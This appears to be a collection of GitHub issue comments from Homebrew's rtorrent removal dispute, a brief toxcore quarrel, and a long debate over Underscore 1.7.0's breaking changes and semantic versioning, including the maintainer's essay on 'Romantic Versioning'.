> Who exactly is the person responsible for the recent ""maintenance"" of rtorrent?

I don't know who is responsible for maintaining `rtorrent` itself (what we call upstream), but in Homebrew there's no fixed maintainer. The formula is maintained by interested users who wish to contribute to the project and occasionally by the Homebrew maintainers themselves.
"
3224	"Martin,

Where, then, is the place to raise such an issue? Evidently, it's entirely unimportant that I know where exactly is proper, but it’s supremely important that I know the legacy repository is the ""wrong place"". Is pedantry the primary object of projects such as these? It would seem so. 

Tell me, Martin, where would be the proper place to opine that homebrew’s obfuscation of “boneyarded” formulae is one of the worst UI design “features” I’ve encountered in months?

-Marshall Eubanks

> On Jul 6, 2016, at 4:24 PM, Martin Afanasjew notifications@github.com wrote:
> 
> This legacy repository is the wrong place to raise such an issue. Nevertheless, Homebrew/homebrew-core#369 https://github.com/Homebrew/homebrew-core/pull/369 and the issues/PRs linked from it might help you understand the decision. It's not like we remove formulae to annoy people. We tend to have good reasons. That said, if all the existing issues can be resolved, we'll gladly accept a pull request that re-introduces this formula in Homebrew.
> 
> Who exactly is the person responsible for the recent ""maintenance"" of rtorrent?
> 
> I don't know who is responsible for maintaining rtorrent itself (what we call upstream), but in Homebrew there's no fixed maintainer. The formula is maintained by interested users who wish to contribute to the project and occasionally by the Homebrew maintainers themselves.
> 
> —
> You are receiving this because you authored the thread.
> Reply to this email directly, view it on GitHub https://github.com/Homebrew/legacy-homebrew/issues/50683#issuecomment-230894849, or mute the thread https://github.com/notifications/unsubscribe/ACxZ9SNpz8F7LeVThL47ekmhIAw2IB-zks5qTA7kgaJpZM4JGc7Z.
"
3225	"Please reconsider your tone and have a look at our [Code of Conduct](https://github.com/Homebrew/brew/blob/master/CODEOFCONDUCT.md)! I appreciate that you're affected by this, but the way you're approaching this isn't constructive and doesn't motivate others to help you.

> Where, then, is the place to raise such an issue?

If you open a new issue at https://github.com/Homebrew/legacy-homebrew/issues/new, as you just did with this one, you should have been presented with an [issue template](https://github.com/Homebrew/legacy-homebrew/blob/master/.github/ISSUE_TEMPLATE.md) that answers this. It's not pedantry; after all you have an issue that you would like to see resolved, thus it should be in your best interest to post the question to the right forum. (Still, you got a complete and timely answer from me.)

> Tell me, Martin, where would be the proper place to opine that homebrew’s obfuscation of “boneyarded” formulae is one of the worst UI design “features” I’ve encountered in months?

That's an opinion and not constructive. Feel free to vent off your anger on Twitter, Facebook, your blog, or any other (social) medium available to you. If you feel like contributing or discussing constructively, you can do so here or in other Homebrew-related repositories on GitHub.
"
3226	"The ""template"" in question does nothing more than instruct folks NOT to open issues. The cases were it allows for opening issues involve the use of ""brew"" commands, which quite simply does not apply here (and that's _not_ being pedantic). Sorry, but that isn't helpful to people who aren't already in the clique. 

Think about this: it is self-evident that the function of Homebrew is not to make the lives of formulae maintainers easier. Its _function_ is ensure the repeatability of their work, so that future users can benefit from the effort they've already expended building others' code. OK.

And yet we have an instance where completely functional code, which Homebrew is perfectly capable of building in an entirely algorithmic fashion with a simple modification of the install command, is ""boneyarded"" and essentially completely obfuscated from the casual user (and any obvious Google searching he might do). Does the average Homebrew user care about the difference between ""boneyarded"" and actively maintained formulae? Of course he doesn't. He merely wants (for instance) rtorrent installed. And yet, a stock Homebrew install will refuse to install rtorrent. It will give no indication of rtorrent's status, or the reasons for its being ""boneyarded.""

Much more sensible would be to simply build rtorrent with gcc 4.9 by default. If this is really too far out of line with homebrew's recent ready-built philosophy, it could ask the user for permission first, or instruct him in forcing the install via brew commands. If none of this is good enough, it should _at the very least_ inform the user that the formula is available, but only in the ""boneyard"".

As is stands, the decision regarding rtorrent has no conceivable benefit to anybody but formulae maintainers – _and_ it actively harms users by withholding valuable software. And if that's valid justification for a decision, what's the point of Homebrew in the first place? 

This isn't to say maintainers are irrelevant, merely that there's a better way to deal with this type of case (for the end user's sake) than what is presently being done.

Now, assuming that this _opinion_ is sufficiently ""constructive"", where should I post it?

Incidentally, when you tell me to go on social media, that is exactly in line with the ""tone"" you used in your original response: false civility, a veneer over condescension and pedantry. (Did you honestly believe I needed the difference between formula and actual code maintenance explained? Did you honestly not realize that I was asking about the maintenance of the rtorrent _formula_? Was the context really ambiguous? Of course not. That was pure smugness and condescension on your part.) My tone is merely falling in line with the one you set – albeit passive-aggressively in your case, and openly in mine. 
"
3227	"> It will give no indication of rtorrent's status, or the reasons for its being ""boneyarded.""

If you run `brew search rtorrent` it’ll give you a link to the PR that boneyarded it, which itself has links that explain why it was done.

```
$ brew search rtorrent
No formula found for ""rtorrent"".
==> Searching pull requests...
Closed pull requests:
boneyard libtorrent/rtorrent (https://github.com/Homebrew/homebrew-core/pull/369)
```

> Much more sensible would be to simply build rtorrent with gcc 4.9 by default. If this is really too far out of line with homebrew's recent ready-built philosophy, it could ask the user for permission first, or instruct him in forcing the install via brew commands. If none of this is good enough, it should at the very least inform the user that the formula is available, but only in the ""boneyard"".

We encourage you to make a pull-request for that. Note you can also maintain formulae [in your own tap](https://github.com/Homebrew/brew/blob/master/share/doc/homebrew/How-to-Create-and-Maintain-a-Tap.md).
"
3228	"Thanks for the useful response! I'll do that. 

It occurs to me that I never even bothered to use ""brew search"" before – I web search as a matter of habit, which failed me in this case. Perhaps Homebrew should automatically perform a `brew search` if a `brew install` fails all three checks (name search, similar name search, tap search). 
"
3229	"> Does the average Homebrew user care about the difference between ""boneyarded"" and actively maintained formulae? Of course he doesn't. He merely wants (for instance) rtorrent installed.
> 
> it could ask the user for permission first, or instruct him in forcing the install via brew commands.

It's entirely possible the average Homebrew user may not actually be a ""He"", FYI.

Your tone with Martin is unhelpful. Long, winding rants at people who run projects don't actually help you get your own way, here or in any other FOSS project. You asked why it was removed, you were given an answer. When it comes to moaning Homebrew is awful, either put up PRs to improve the situation or stop yelling at the people who do free work for you, Cheers.
"
3230	"> Think about this: it is self-evident that the function of Homebrew is not to make the lives of formulae maintainers easier.

That is a function, actually: https://github.com/Homebrew/brew/blob/master/share/doc/homebrew/Maintainers-Avoiding-Burnout.md#3-prioritise-maintainers-over-users

> And yet we have an instance where completely functional code, which Homebrew is perfectly capable of building in an entirely algorithmic fashion with a simple modification of the install command, is ""boneyarded"" and essentially completely obfuscated from the casual user (and any obvious Google searching he might do).

The reason it was boneyarded was because it cannot be built with Clang, OS X's default compiler for many versions at this point. As it cannot be built with Clang we cannot build a binary package and it's arguably not ported to OS X. If/when it builds with Clang without patches: we'll consider re-adding it to Homebrew.

> When it comes to moaning Homebrew is awful, either put up PRs to improve the situation or stop yelling at the people who do free work for you, Cheers.

Agreed.
"
3231	"@marshaul If you'd like to yell at someone, you're probably looking for me: https://github.com/Homebrew/homebrew-core/issues/157#issuecomment-207563760

For what it's worth, tapping homebrew/versions and installing gcc49, then tapping homebrew/boneyard and installing rtorrent is not a huge deal. Since gcc4\* has been moved out of core, you'd have to tap homebrew/versions even if we hadn't boneyarded rtorrent. Also needing to tap homebrew/boneyard isn't asking that much more.

We have some rules about which compilers are required for core. Rules are always going to cause people to bristle under various circumstances, but they provide some structure and expectations, and make what we support and don't support clear.

If you really do want to fix this situation with rtorrent, encourage the upstream developer to iron out the clang and gcc5 issues. I'm certain those issues can eventually be resolved if the developer chooses to take them up.
"
3232	"Stop defacing things.
"
3233	"Man up and face this. At least lock it and contact him personally.
"
3234	"This is really sickeningly sad.
"
3235	"I'm siding with @dfortner, @Proplex, @notadecent and many others here. This is NO way to manage a project.
"
3236	"I have to agree with what @TheLastProject says. Please don't, @irungentoo 
"
3237	"This repo is about toxcore and toxcore only.

If you want to discuss non toxcore related things go somewhere else.
"
3238	"I think we should leave 1.7.0 as 1.7.0. There are a lot of changes, some of which change behavior for edge cases, which justifies bumping the minor version up a notch. If you're using npm's `~` operator, you won't be automatically upgraded to 1.7.0.

But it's not really the kind of complete overhaul or massive change to the public API that justifies a **2.0**. Perhaps once things are really polished and locked down.

But that said, let's leave this ticket open for discussion...
"
3239	"> If you're using npm's ~ operator, you won't be automatically upgraded to 1.7.0.  

By default npm uses ^
"
3240	"[According to Semver.org](http://semver.org) bumping the minor release should:

> MINOR version when you add functionality in a backwards-compatible manner, and

If the behaviors changed do not solely constitute urgent bug fixes which were causing the edge cases to change, this is not a minor release.

Coupled with the change to NPM moving to `^` which will accept any version within a major release AND the fact that underscore is the MOST depended upon package in NPM it is likely better to resolve this issue as @danielchatfield suggests.

From your changelog:

>  Underscore templates no longer accept an initial data object. _.template always returns a function now. 

Changing a method signature and what it returns (without it previously being deprecated) in a minor version is a pretty big deal:

```
> 14:21:41 ~/src/test
↳ npm i underscore
npm http GET https://registry.npmjs.org/underscore
npm http 304 https://registry.npmjs.org/underscore
npm http GET https://registry.npmjs.org/underscore/-/underscore-1.7.0.tgz
npm http 200 https://registry.npmjs.org/underscore/-/underscore-1.7.0.tgz
underscore@1.7.0 ../../node_modules/underscore
14:21:47 ~/src/test
↳ node
> var und = require('underscore');
undefined
> und.template('hello: <%= name %>', {name: 'moe'});
{ [Function]
  source: 'function(obj){\nvar __t,__p=\'\',__j=Array.prototype.join,print=function(){__p+=__j.call(arguments,\'\');};\nwith(obj||{}){\n__p+=\'hello: \'+\n((__t=( name ))==null?\'\':__t)+\n\'\';\n}\nreturn __p;\n}' }
>
```

Versus:

```
14:20:43 ~/src/test
↳ npm i underscore@1.6.0
npm http GET https://registry.npmjs.org/underscore
npm http 200 https://registry.npmjs.org/underscore
npm http GET https://registry.npmjs.org/underscore/-/underscore-1.6.0.tgz
npm http 200 https://registry.npmjs.org/underscore/-/underscore-1.6.0.tgz
underscore@1.6.0 ../../node_modules/underscore
14:20:52 ~/src/test
↳ node
> var und = require('underscore');
undefined
> und.template(""hello: <%= name %>"", {name: 'moe'});
'hello: moe'
```
"
3241	"@jashkenas I understand and respect [your stance](https://github.com/jashkenas/backbone/issues/2888#issuecomment-29076249) regarding semver. However, when making breaking changes I believe there is a universal expectation (that predates semver) to bump a major version. At the very least it sets expectations properly, but it will also help those who do follow semver (which is the vast majority of developers these days).

Considering how many people who depend of underscore now have broken code because of this latest release, I think it would be a good decision to do what @megawac [said](https://github.com/jashkenas/underscore/pull/1799#issuecomment-53581427):

> releasing 1.7.1 or 1.8 as a revert of 1.6.0 and then working on 2.0.0 for some time next week
"
3242	"+1 on removing and replacing with 2.0.0. Rigid semver specifies that no breaking changes can appear except as a major version (unless you're below version 1.0). This has introduced mysterious breaks for me, deep in node module hierarchies. :0(
"
3243	"This definitely just caused major issues for me. That's what I get for not thoroughly reading the changelog, but I didn't imagine a minor version upgrade would be that dangerous.

Is the solution to add backwards compatibility back into 1.7?
"
3244	"> If you're using npm's ~ operator, you won't be automatically upgraded to 1.7.0.

This really isn't the point. Semver is meant for humans just as much as machines. The _entire point_ of semver is to give confidence to consumers of the library that they can safely upgrade, whether that happens automatically with a package manager instruction or by hand.

> it's not really the kind of complete overhaul or massive change to the public API that justifies a 2.0

That's not what the major number is for though. It's for _any_ breaking change.
"
3245	"I'm :+1: for revising how Underscore bumps. It seems like most releases in recent memory have had some kind of hiccup with the 1.7.0 bump being the worst (failed unit tests, incomplete features, missing documentation, missing breaking change notices, and versioning that caused many projects to break). The process as it stands today isn't working. 
"
3246	"Underscore is among the most popular packages on npm. The whole npm ecosystem is based on semver. Underscore should respect semver.
"
3247	"Underscore templating changes in 1.7.0 broke our project/templates and we had to revert back to 1.6.0. Pretty big / major change to the templating system alone.
"
3248	"As much as I'd like to make everyone happy by using ""semantic versioning"" — I'm afraid I just can't swallow the stuff. This margin is too narrow to contain the argument against it, but suffice to say, Node doesn't do it, Rails doesn't do it, Python doesn't do it, jQuery doesn't (really) do it — and as a fun little open-source project, it's nice for us to provide real version numbers that are useful for humans, instead of mechanical version numbers that are of merely dubious use for computers.

But you can have your cake and eat it too. I've just published an ""official"" npm repository for **underscore-semver**, which will be released at the same time as Underscore is released, and will always contain a ""semantic"" derivation of the true Underscore version number. Feel free to depend on that, if you prefer: https://www.npmjs.org/package/underscore-semver

For the curious, or if you'd like to do something similar, here's the script I'll be using to keep things in sync: https://gist.github.com/jashkenas/c71021bba8ee580ded92

I hope that's an acceptable solution.
"
3249	"I'm sorry @jashkenas thats a ridiculous response. What is the human readability issue about `v2.0` over `v1.7`. Underscore breaking releases don't have to be more than once a year. Moreover they don't all have to be breaking as the **underscore-semver** repo seems to indicate...

All people are asking is when you **change the contract** (not extending the contract) of the function, you let them know via a **major bump**.
"
3250	"Additionally the an issue here is nested deps -- things that rely on underscore that you in turn rely on. Now, each of those packages needs to be updated and published to point to a new repo as well. Things that may not be well maintained may be forever broken now. 
"
3251	"Tl;DR goodbye underscore, hello lodash
"
3252	"The most useful thing you can do with a version number is not break people's code.

Regardless of opinions on semantics, it was obvious before this release that using `1.7.0` as the new version number would break a significant amount of code, likely in a non-obvious manner.  I've yet to hear any reasoning that could justify that loss in user trust and productivity.
"
3253	"Having two identical repos with different versioning schemes is going to lead to even more headaches than having nonstandard versioning.
"
3254	"It's one thing to state, @jashkenas, the way in which you believe version numbers should be used. The underscore-semver package, though, is a straw man: none of us is suggesting that Underscore should be at v170.0.0 by now!
"
3255	"@jashkenas -- Wait, so when people came to your project with real concerns about the health of the node.js ecosystem and the expenditure of thousands of man-hours fixing things and hunting bugs, your response was to write a script to sync something over to a version called ""**v170.0.0**""? (which also does nothing to address the issues they identified with an existing install base)

seriously? don't you think that's kind of going to alienate parts of the community? it's a whole lot easier to read that as spite than as an attempt to be helpful... you're in a position of some responsibility and authority here, and this sort of thing just lets everybody down.
"
3256	"Cross-posted from https://gist.github.com/jashkenas/cbd2b088e20279ae2c8e:

Spurred by recent events (https://news.ycombinator.com/item?id=8244700), this is a quick set of jotted-down thoughts about the state of ""Semantic"" Versioning, and why we should be fighting the good fight against it.

For a long time in the history of software, version numbers indicated the relative progress and change in a given piece of software. A major release (1.x.x) was _major_, a minor release (x.1.x) was _minor_, and a patch release was just a small patch. You could evaluate a given piece of software by name + version, and get a feeling for how far away version 2.0.1 was from version 2.8.0.

But Semantic Versioning (henceforth, SemVer), as specified at http://semver.org/, changes this to prioritize a mechanistic understanding of a codebase over a human one. _Any_ ""breaking"" change to the software must be accompanied with a new major version number. It's alright for robots, but bad for us.

SemVer tries to compress a huge amount of information — the nature of the change, the percentage of users that will be affected by the change, the severity of the change (Is it easy to fix my code? Or do I have to rewrite everything?) — into a single number. And unsurprisingly, it's impossible for that single number to contain enough meaningful information.

If your package has a minor change in behavior that will ""break"" for 1% of your users, is that a breaking change? Does that change if the number of affected users is 10%? or 20? How about if instead, it's only a small number of users that will have to change their code, but the change for them will be difficult? — a common event with deprecated unpopular features. Semantic versioning treats all of these scenarios in the same way, even though in a perfect world the consumers of your codebase should be reacting to them in quite different ways.

Ultimately, breaking changes are no fun, and we should strive to avoid them when possible. To the extent that SemVer encourages us to avoid changing our public API, it's all for the better. But to the extent that SemVer encourages us to pretend like minor changes in behavior aren't happening all the time; and that it's safe to blindly update packages — it needs to be re-evaluated.

Some pieces of software are like icebergs: a small surface area that's visible, and a mountain of private code hidden beneath. For those types of packages, something like SemVer can be helpful. But much of the code on the web, and in repositories like npm, isn't code like that at all — there's a lot of surface area, and minor changes happen frequently.

Ultimately, SemVer is a false promise that appeals to many developers — the promise of pain-free, don't-have-to-think-about-it, updates to dependencies. But it simply isn't true. Node doesn't follow SemVer, Rails doesn't do it, Python doesn't do it, Ruby doesn't do it, jQuery doesn't (really) do it, even npm doesn't follow SemVer. There's a distinction that can be drawn here between large packages and tiny ones — but that only goes to show how inappropriate it is for a single number to ""define"" the compatibility of any large body of code. If you've ever had trouble reconciling your npm dependencies, then you _know_ that it's a false promise. If you've ever depended on a package that attempted to do SemVer, you've missed out on getting updates that probably would have been lovely to get, because of a minor change in behavior that almost certainly wouldn't have affected you.

If at this point you're hopping on one foot and saying — _wait a minute, Node is 0.x.x_ — SemVer allows pre-1.0 packages to change anything at any time! You're right! And you're also missing the forest for the trees! Keeping a system that's in heavy production use at pre-1.0 levels for many years is _effectively the same thing as not using SemVer in the first place_.

The responsible way to upgrade isn't to blindly pull in dependencies and assume that all is well just because a version number says so — the responsible way is to set aside five or ten minutes, every once in a while, to go through and update your dependencies, and make any minor changes that need to be made at that time. If an important security fix happens in a version that also contains a breaking change for your app — you still need to adjust your app to get the fix, right?

SemVer is woefully inadequate as a scheme that determines compatibility between two pieces of code — even a textual changelog is better. Perhaps a better automated compatibility scheme is possible. One based on matching type signatures against a public API, or comparing the runs of a project's public test suite — imagine a package manager that ran the test suite of the version you're currently using against the code of the version you'd like to upgrade to, and told you _exactly_ what wasn't going to work. But SemVer isn't that. SemVer is pretty close to the most reductive compatibility check you would be able to dream up if you tried.

If you pretend like SemVer is going to save you from ever having to deal with a breaking change — you're going to be disappointed. It's better to keep version numbers that reflect the real state and progress of a project, use descriptive changelogs to mark and annotate changes in behavior as they occur, avoid creating breaking changes in the first place whenever possible, and responsibly update your dependencies instead of blindly doing so.

Basically, **Romantic Versioning**, not Semantic Versioning.

All that said, okay, okay, fine — Underscore 1.7.0 can be Underscore 2.0.0. Uncle.

(typed in haste, excuse any grammar-os, will correct later)
"
3257	"Kudos Jeremy for making this happen. So will there be a 1.7.1 reverting the (breaking) changes? (Or reverting to pre-1.7.0?) That'd be double-awesome.
"
3258	"+1 @jashkenas, thanks for listening.
"
3259	"1.7.1 — then 2.0.0 when @megawac is ready to roll with it.
"
3260	"> Node doesn't follow SemVer

Just to clarify, node is pre 1.0 which allows to break without bumping major version numbers. See point 4 of semver.

> Major version zero (0.y.z) is for initial development. Anything may change at any time. The public API should not be considered stable.
"
3261	"Though most people agree that node being pre 1.0 at this point with 1000s of companies using it in production is a bit of a joke. At least if you take SemVer seriously. If not, it's par for the course.
"
3262	"> Just to clarify, node is pre 1.0 which allows to break without bumping major version numbers. See point 4 of semver.

I added a paragraph for you:

If at this point you're hopping on one foot and saying — _wait a minute, Node is 0.x.x_ — SemVer allows pre-1.0 packages to change anything at any time! You're right! And you're also missing the forest for the trees! Keeping a system that's in heavy production use at pre-1.0 levels for many years is _effectively the same thing as not using SemVer in the first place_.

Cheers!
"
3263	"@jashkenas :+1: 

From HN:

> I can accept everything you have written here - my feelings towards semver are very similar to your own. I feel in this instance what transpired was a deviation from what you have written - I went to start a new project and 2 of the dependencies I installed (out of 10) had problems, this release changed a lot of stuff that affected many of the dependent modules.
> 
> > If the asshole responsible...  
> 
> If anyone was the asshole it was me, however I truly believe that underscore is better off and I would like to thank you for all the work you have put into it. :)

I think all meaningful discussion has been had, you may want to lock this issue. Thanks again for all your hard work.
"
3264	"Thanks for underscore, @jashkenas. I think what you've done is reasonable, and I hope this issue will get more people to lock to major/minor rather than locking to the major version in their manifests.
"
3265	"@jashkenas you can always say that v2+ will no longer follow semver and to always depend on underscore with a `~`
"
3266	"@jashkenas Your argument against SemVer is surprisingly solid. And I agree with basically all of your points.

I do however have one point/question, and I'd be curious to hear your response.

I might be completely alone with this opinion, but I tend to categorize software packages into three main categories: libraries, frameworks, and applications.

And I can easily understand how applications like MS Office, and Photoshop would just confuse the shit out of people if they used SemVer. Versioning becomes a marketing issue more so than a development one for them. And I tend to think the same applies to a lesser extent to frameworks like Rails for example.

However, with a low-level library by programmers for programmers, it makes less sense to me. Obviously any change to a library I use should be reviewed rather than blindly accepted. But at the same time I'd also like to have a heads up about how big of a change and potential time drain a package version bump might be.

Personally I've found that if a project is not following SemVer, it makes me end up treating any version bump as if it was a major version bump where I'd have to assume everything will break and I might need to spend days dealing with aftermath of the upgrade.

Potentially this is a good thing, but for the most part for me it means a patch version is released with a security fix for example, and because of time constraints I don't even bother looking at it until some point in the future when I have time to deal with any potentially massive and/or breaking changes. While in contrast if it's a library I know uses SemVer, I'd quickly spend those 20 seconds to 5 minutes to see what's changed, apply the update and get the security fix.

And as a final argument for the use of SemVer in library development. If I'm building a project or even another library, that depends on underscore and other libraries. I would prefer to at set the dependency version to `0.0.x` so users of my library might get bug fixes from patch versions of my dependencies without me having to update my library too whenever any of my dependencies are updated.

In short, the version number representing the conceptual state of the software makes sense for applications, and to a lesser extent frameworks too. But much less so for a library. If I'm gonna take the example to the extreme:

A library could be rewritten to improve it's internal code structure, and in the process completely changing it's API, but without adding any new features. And so because there's no new features, it could arguably only merit a minor version bump, cause conceptually the library still only does the exact same thing and hasn't really changed in terms of it's conceptual state. This would be a headache, cause arguably this minor version bump should have been rename to a new project as it's API is completely different.
"
3267	"I don't think this is an argument against semver, but an argument for the semver used in practice rather than the semver exactly as described in the spec. If you lock to the major version alone, you're probably going to have problems, whether you're using npm, rubygems, or another package manager that uses semver. I hope the semver spec will be updated to something closer to what's used in practice, or its maintainers will point to a successful widespread application of it, for us to draw inspiration from.
"
3268	"> SemVer allows pre-1.0 packages to change anything at any time!

Which is why if you are depending on a pre-1.0 package, you should have that shit locked down and be especially attentive of the changelog when upgrading.

After releasing 1.0, a package author is making a statement that they are confident in the decisions they've made and are willing to maintain backwards compatibility until 2.0.

> You can also do this in future major releases with a `2.0.0-beta.x` stage, where you can make breaking changes several times until you're happy with the results and craft the final major release afterwards.

The real point of SemVer (at least in my mind) is to be a structure for a package to build up a level of trust with its users. In other words: a package maintainer/contributor should be actively thinking about the changes they're making and how it will affect others.

We strictly follow SemVer in the Marionette, which is why we regularly see people upgrade from early releases of v1 all the way up to the last release of v1 without changing a single line of code. They get dozens of new features and bug fixes [for free](https://www.youtube.com/watch?v=c0y9DkJcxH4).

Then when we bumped to [v2](https://github.com/marionettejs/backbone.marionette/releases/tag/v2.0.0), we had a massive set of changes (we also made several 2.0.0-beta.x releases). However, we were careful that there was a clear upgrade path. With an even more [detailed changelog](https://github.com/Puppets/marionette-changelog-detail), and even an [upgrade tool](https://github.com/marionettejs/Marionette.Upgrade). We even have a nice [roadmap](https://github.com/Puppets/marionette.roadmap) for transparency. As a direct result of this, our community puts a lot of trust in us.

I love Underscore and Backbone, that being said I have trouble [trusting](http://i.imgur.com/XPsgIPs.gif) them.
"
3269	"@jimeh The trouble with that as I see it is, semver doesn't allow you to distinguish between
1. Large breaking changes that affect everybody significantly
2. Breaking changes that affect obscure users significantly
3. Breaking changes that affect everybody trivially
4.  Breaking changes that affect obscure users trivially

I would argue, based purely on the meaning of ""major"", ""minor"", and ""patch"", that case 1 should bump major, cases 2 and 3 should bump minor, and we can argue about case 4.

Semver forces all cases to be considered ""major"".  This is unnecessarily pessimistic about the actual work required to upgrade, and a user who locks to major will not get updates that could be free or near-free level of effort.

It's also unrealistic about the maintainer's responsibility.  Probably any change could conceivably break some code, somewhere, if you think hard enough.  Packages like underscore-semver are partly a joke, but they're partly an honest reflection from a software developer who works for free that he's not going to realistically invest the time to test every change against an unknown and variable downstream ecosystem.

Finally, no version scheme can really protect you against breaking changes.  Even if you had the QA team to plausibly say you are confident that 1.0.1 didn't break anything (which pretty much no project that uses semver actually does), being confident and being right are two different things.  You will still release a .patch release that breaks things now and again, and so downstream needs some plan other than ""look at the version number"" to ensure that upgrades don't break behavior.
"
3270	"I did find @jashkenas' argument pretty good.

But the fact remains that SemVer is useful and essential (at least for our team) to avoid dependency hell. Libraries are great, they save code and time, but I don't _want_ to have read every single changelog of every single package of every single application we have whenever they update. That would end up taking hours each week! Knowing and for the most part feeling confident in the fact that any `*.x.x` will work, `x.*.x` will contain some fixes and improvements/features, and `x.x.*` will usually just contain fixes, is pretty vital to being able to maintain dependencies efficiently.

Honestly, not mentioning any names, I'd _much_ rather use a package which tries to maintain this compatibility scheme - or at the very least fails verbosely and descriptively if a breaking change is absolutely necessary - rather than one which rejects the good (SemVer) for lack of the perfect.
"
3271	"> SemVer tries to compress a huge amount of information — the nature of the change, the percentage of users that will be affected by the change, the severity of the change (Is it easy to fix my code? Or do I have to rewrite everything?) — into a single number. And unsurprisingly, it's impossible for that single number to contain enough meaningful information.

I would agree with @jashkenas if this were true, but it isn't. The percentage of users affected by the change isn't denoted anywhere, the severity isn't denoted anywhere, ease of fix isn't denoted anywhere, and rewrite requirement isn't denoted anywhere. That was complete and total garbage.
- Major versions contain changes to previously existent functionality, and can break your code.
- Minor versions contain additions to previously non-existent functionality, and can't break your code.
- Patches contain changes to previously existent functionality that is broken, and can _not_ break your code (unless you're relying on the bug – which means you aren't using the functionality as documented).

I understand the attachment to the romantic notions of `v2.0` and `v3.0` as full code rewrites, but that's not how the rest of the community works. Get it fixed, or get forked.

P.S. Why did you publish the package `underscore-semver` to NPM as `v170.0.0`? It wasn't funny, and NPM squatting isn't welcome – especially when you're taking up a useful name (since underscore apparently doesn't follow SemVer).
"
3272	"""I'd much rather use a package which tries to maintain this compatibility scheme - or at the very least fails verbosely and descriptively if a breaking change is absolutely necessary - rather than one which rejects the good (SemVer) for lack of the perfect.""

Thank you @connor4312 for this.
"
3273	"It seems to me there is not one person who has an argument against SemVer and can offer a viable alternative. If SemVer is so bad, tell me what's better, I'll give it a go.

You guys don't want to wait for new features in 1.7 and are stuck on 1.6? Don't wait for the official release, use a release candidate. They have all the newest features for beta testing before they go public, that's what they're for. If you want to be a beta tester, want all the latest and greatest immediately, fantastic. We need people like you to use new code and report on any bugs so when it does go public, the rest of use have a smooth upgrade.

Unfortunately, I'm not one of those people. At least not all the time, I'm definitely an early adopter on side projects. I upgrade all my dependencies to their pre-alpha-release-candidate versions (like the ones that are pretty much telling you there are more bugs than features), just so I can tinker around with new behavior. 

However, when you maintain a large codebase, written before your time, with many dependencies, you can't review the change log for every patch. That would take most of my time, and I have my plate full of bugs and new features I need to add to my own code. I schedule all my tasks. The scope of the work directly affects when and if I'm going to do it; everything is planned out. Today I'm doing items 1, 2, and 3. I can squeeze in the 3rd because item 2 (upgrade a library) is a minor version upgrade, should only take a minute. As it turns out, the change broke a bunch of my tests, I have to go identify the problem, and before you know it I'm either making widespread changes to my codebase, or I'm reverting the upgrade. Option 1 puts me over budget on time, I can't get everything done, so now I look bad. Option 2 forces me to not complete item 2, I can't get everything done, so now I look bad.

Simple solution: review the change log. It's not difficult, and the change log for 1.7 stated outright `_.template` was no longer backwards compatible. Had I read it carefully, no issue. I'm fine with that, from now on I know not to trust Underscore's versioning scheme, since I (as did everyone it seems) assumed it ran on SemVer. Or even better, don't adopt new versions immediately. I assumed a version, at the time it went public, would be thoroughly tested for obvious problems like this. Lesson learned, don't make assumptions like that, stay a version behind to play it safe. That being said, I don't really care what kind of versioning Underscore uses, I just want to be on the same page as the maintainers. But to be honest, if the version reflects the aesthetic progress of a library in a ""human"" format rather than an indication if my code will work, what do I care as a user if Underscore is upgrading from 1.7 to 2.0? I don't, at all. It's just another upgrade to me. 1.7 to 2.0 in SemVer means something.

I'm not saying anyone is in the wrong here, I think it's just simple miscommunication between how the maintainers and users treat versioning of the library. And I think its safe to say we're all on the same page now. The only concern I have is through this whole experience, I feel like I lost some trust in the library. And that's just disappointing.
"
3274	"Don't hate the tool, hate how it's used. SemVar is ultimately about the library owner being fully aware of  how much trouble breaking changes can have. Hypothetically, the new `_.template` could have stayed in a stable `2.0.0-beta-x` branch indefinitely, waiting for breaking changes to accumulate. When it got to `2.0.0-beta-19` and the community felt that it was time to commit to the new API rather than hide behind betas, that's when `2.0.0` can be released. The arduousness of the process is motivation to think very carefully about adding functionality in the first place.

And yet. Fracturing the codebase with pent-up changes just makes it hard to switch (see: Python 3). SemVar removes a lot of the freedom from the developer to make minor but breaking changes to improve an API by making it more flexible, more consistent, or the like, which just entombs the wrong way. In some sense it's best to rip off the band-aid quickly and be done with it. Because mistakes happen, and adding strict supersets of behavior isn't always plausible. Software development is hard, and we need some freedom to go and fix our inevitable mistakes.
"
3275	"Just to add my 2¢...
All of this is about a social contract. It has nothing to do with prioritizing a machinistic understanding over a human one. Instead it is about the realization that the person that is patching is not always a developer 

Semver creates a social contract that says to an admin; if it is a minor or patch release apply it.  Otherwise, wait for your dev team to evaluate it. This enables things like security fixes to be applied faster than the normal change cycle. That is an important piece that we shouldn't loose. 

That said, Having a way to indicate the magnitude of changes would be a welcome extension.  However, I don't think that need merits throwing the baby out with the bath water to get it. Instead, couldn't we solve both needs by adding a revision number, or commit count, to the end of Semver?
"
3276	"I guess what troubles me is that you're all complaining to Jeremy about his responsibilities to your projects, even though you didn't take the responsible step of avoiding NPM's default '--save' behavior, which is to use ^n.n.n.  This default behavior of NPM is braindead and has always led to weird versioning problems with any number of other libraries.  You also assume that underscore is exclusive to the node ecosystem, which it most certainly is not.  I'm not sure if Jeremy needs to apologize for that or to act on it.  Start taking control over your projects, use '~n.n.n'
"
3277	"@kode4food I can do that, but I can't make all the dependencies which in turn rely on underscore do that.
"
3278	"@danielchatfield pull request and then cross your fingers?
"
3279	"I think a new property in the package.json for npm would be nice, so that projects could provide a reasonable default for `npm install --save`. So projects which use semver could set this to `^x.x.x` and others might set it to `~x.x.x` or even `x.x.x`.
"
3280	"@niclashoyer I just read the entire thread and you're the first person with a meaningful solution to the problem. To all the SemVer haters I say of course there are problems, but 
1) no one has really given a better alternative other than @niclashoyer here.
2) You say I should take the time to upgrade my dependencies manually. But guess what I do. When a major version changes, I go and make the upgrade manually and deal with the changes, but it's nice to know that sub-dependencies are something I don't have to worry about. Not following SemVer helps no one. Following SemVer hurts no one. Of course it's not perfect and it doesn't talk about the stage a project is in to humans. Guess what, I think You should just start using a separate number for humans and a separate number for machines!
"
3281	"Guys, read and learn from others.... they have already solve this problem.
"
3282	"@niclashoyer Absolutely +1, that would best for everyone.
"
3283	"@drewcrawford I have a few arguments for you.

**TL;DR:** 
- **Let the version number indicate the version of the public API of your library.** As a user of a library I don't care if the `doCoolShit` method was completely rewritten in a mind blowing way, as long as the public API was not (intentionally) changed.
- SemVer allows library authors and users to quickly infer the intention of any specific update based on it's version number.
- GutVer (bumping version numbers when it ""feels right"") will mean wildly different things to different people.
